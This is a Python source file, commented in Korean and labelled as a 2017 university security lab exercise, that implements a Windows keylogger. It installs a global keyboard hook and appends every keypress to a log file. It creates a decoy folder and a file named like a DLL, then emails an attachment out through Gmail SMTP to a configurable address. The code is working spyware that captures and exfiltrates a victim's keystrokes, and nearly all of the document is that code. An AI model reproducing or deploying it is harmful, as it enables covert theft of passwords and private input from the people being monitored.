"""
17년도 2학기 보안 실습
후킹 + 메일전송
후킹 : 파이썬 해킹 입문 참고 및 수정 및 추가 키값 해석기(convert.py 참조)
메일전송 : 인터넷 참고
"""

# 필요 import 부문
import sys
import os
import smtplib
import time
import datetime
import random

from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.header import Header
from email import encoders

"""
Mail

Gmail 사용
Gamil 계정 세팅해야함
"""

# 하단 4개 수정해서 사용
gmail_username=""
gmail_user=""
gmail_pwd=""
attach_file=""

def send_gmail(to, subject, text, html, attach):
    msg=MIMEMultipart('alternative')
    msg['From']=gmail_username
    msg['To']=to
    msg['Subject']=Header(subject,'utf-8') # 제목 인코딩
    msg.attach(MIMEText(text, 'plain', 'utf-8')) # 내용 인코딩
    msg.attach(MIMEText(html, 'html', 'utf-8')) # 내용 인코딩 2

    # 아래 코드는 첨부파일이 있을 경우에만
    part=MIMEBase('application','octet-stream')
    part.set_payload(open(attach, 'rb').read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition','attachment; filename=attach')
    msg.attach(part)

    # gmail 사용
    mailServer=smtplib.SMTP("smtp.gmail.com",587)
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(gmail_user,gmail_pwd)
    mailServer.sendmail(gmail_user, to, msg.as_string())
    mailServer.close()

def mainLoop():
    message = ""
    html = ""   #메일 내용
    title=""    #메일 제목

    print("Program Ready")
    print("----------------------")

    #전송받을이메일, 수정해서 사용
    email = ""

    #전송한 시간 체크
    print ("[" + str(datetime.datetime.now()) + "] Sending email to " + email + "...")

    #메일 전송 함수
    send_gmail(email,title,message,html,attach_file)

    #완료 후 출력 함수
    print("Mails have just been sent. The program is going to end.")

"""
Hook
"""
# windll사용
user32 = windll.user32          #1  windll을 사용해서 user 32와 kernel32형 변수를 선언한다.
kernel32 = windll.kernel32      # 해당 DLL에서 제공하는 함수를 사용할 때는 'user32.API명' 또는 'kernel32.APZI명'
                                # 과 같은 방식으로 사용이 가능하다.
# 변수 선언부
# 하단 값 수정하여 사용(원하는 키값, conver.py 참고)
WH_KEYBOARD_LL = 13             #2  Win32 API 내부에서 정의해서 사용하는 변수값들은 MSDN이나 인터넷 검색을 통해
WM_KEYDWON = 0x0100             # 쉽게 확인할 수 있다. 변수로 선언해서 미리 넣어 준다.


# 클래스 정의
class KeyLogger:                #3  Hook을 설정하고 해제하는 기능을 가진 클래스를 정의한다.
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    # Hook 설정 함수 정의
    def installHookProc(self, pointer):         #4 user32 DLL의 SetWindowsHookExA()함수를 사용하여 Hook을 설정한다.
        self.hooked = self.lUser32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer, kernel32.GetModuleHandleW(None), 0)
        if not self.hooked:                     # 모니터링 할 이벤트는 WH_KEYBOARD_LL이며 범위는 운영체제에서 실행되고 있는 모든 스레드로 설정한다.
            return False
        return True

    # Hook 해제 함수 정의
    def uninstallHookProc(self):            #5 user32의 DLL의 UnhookWindowsHookEx() 함수를 사용해서 Hook을 설정한다.
        if self.hooked is None:             # Hook은 시스템에 부하를 많이 주기 때문에 목적을 달성하면 반드시 해제해야 한다.
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

# 함수 포인터 도출
def getFPTR(fn):                #6 Hook 프로시저(콜백함수)를 등록하려면 함수의 포인터를 전달해야 한다.
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))     # ctypes에서는 이를 위한 메서드를 제공한다.
    return CMPFUNC(fn)                                              # CFUNCTYPE()함수를 통해 SetWindowsHookExA()함수에서 요구하는 Hook 프로시저의 인자와
                                                                    # 인자형을 저장한다. CMPFUNC()함수를 통해 내부에서 선언한 함수의 포인터를 구한다.
# Hook 프로시저 정의
def hookProc(nCode, wParam, lParam):   #7 훅 프로시저는 이벤트가 발생했을 때 사용자 단에서 처리를 담당하는 콜백 합수다.
    if wParam is not WM_KEYDWON:       #  들어온 메시지의 종류가 WM_KEYDWON에 해당하면 메시지 값을 화면에 프린트해주고, 메시지 값이 <Ctrl> 키의 값과 일치하면 훅을 제거한다.
        return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)   # 처리가 끝나면 훅 체인에 있는 다른 Hook 프로시저에게 제어권을 넘겨준다(CallNextHookEx() 함수)
    hookedKey = lParam[0]

    f = open('', 'a')
    temp_txt = str(hookedKey)
    f.writelines(temp_txt+'\n')
    f.close()
    #print(hookedKey)

    #if CTRL_CODE_1 == lParam[0]:
        #print("Ctrl pressed, call uninstallHook()")
    #    keyLogger.uninstallHookProc()
    #    sys.exit(-1)
    return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)

# 메시지 전달
def startKeyLog():          #8 GetMessageA() 함수는 큐를 모니터링하고 있다가. 큐에 메시지가 들어오면 메시지를 꺼내서
    msg = MSG()             #  Hook Chain에 등록된 맨 처음의 Hook으로 전달하는 역할을 한다.
    user32.GetMessageA(byref(msg), 0, 0, 0)

"""
Main
"""

keyLogger = KeyLogger()             #9 먼저 KeyLogger 클래스를 생성한다.
                                    # installHookProc() 함수를 호출하여 Hook을 설정하면서, 동시에 Hook 프로시저(콜백함수)를 등록한다.
                                    # 쿠에 들어오는 메시지를 Hook Chain으로 전달하기 위해 startKeyLog() 험수룰 호출한다.
pointer = getFPTR(hookProc)

if keyLogger.installHookProc(pointer):
    print("")

# 하단 두줄 path값 수정해서 원하는 경로에 지정
os.system("mkdir c:\ProgramDriver")
f = open('C:\ProgramDriver\PIUE112.dll', 'a')
f.writelines('\n')
f.close()
mainLoop()
startKeyLog()
